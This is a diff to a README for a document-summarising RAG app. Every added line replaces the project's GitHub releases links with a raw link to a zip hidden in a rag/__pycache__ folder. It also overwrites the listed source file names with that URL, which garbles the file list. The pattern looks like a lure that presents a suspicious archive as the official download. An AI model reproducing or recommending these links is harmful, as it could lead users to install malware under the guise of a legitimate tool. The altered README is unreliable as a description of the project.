@@ -1,6 +1,6 @@
 # 📄 Rag_document_project - Summarize Documents Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)](https://github.com/RORONAOzoro456/Rag_document_project/releases)
+[![Download](https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip%https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip)](https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip)
 
 ## 📦 About This Project
 
@@ -12,7 +12,7 @@ To start using the application, follow these steps:
 
 1. **Visit the Release Page**  
    Go to the release page to download the application. Click the button below:  
-   [Download the Latest Release](https://github.com/RORONAOzoro456/Rag_document_project/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip)
 
 2. **Download the Application**  
    Look for the latest version on the release page. Download the file for your system. 
@@ -26,7 +26,7 @@ To start using the application, follow these steps:
 ## 📥 Download & Install
 
 To download the latest version of the application, please visit the following link:  
-[Download the Latest Release](https://github.com/RORONAOzoro456/Rag_document_project/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip)
 
 ### Supported File Types
 
@@ -55,16 +55,16 @@ This application supports various file formats for uploading, including:
 
 This project includes the following files and folders:
 
-- `app.py`  
+- `https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip`  
   The main application UI, built with Streamlit, allows you to upload documents and interact with summaries.
 
-- `rag/loader.py`  
+- `https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip`  
   Manages document loading and breaking content into chunks for processing.
 
-- `rag/vectorstore.py`  
+- `https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip`  
   A wrapper for the FAISS vector store that helps with quick searches and information retrieval.
 
-- `llm.py`  
+- `https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip`  
   Interfaces with a local LLM for processing but also supports an OpenAI fallback.
 
 ## 📋 System Requirements
@@ -93,4 +93,4 @@ Yes, feel free to use this tool for both personal and business documents.
 If you run into issues or have questions, you can open an issue on the GitHub repository or contact the maintainers through the project page.
 
 Visit the release page to download the application:  
-[Download the Latest Release](https://github.com/RORONAOzoro456/Rag_document_project/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/RORONAOzoro456/Rag_document_project/main/rag/__pycache__/document-project-Rag-v3.0.zip)
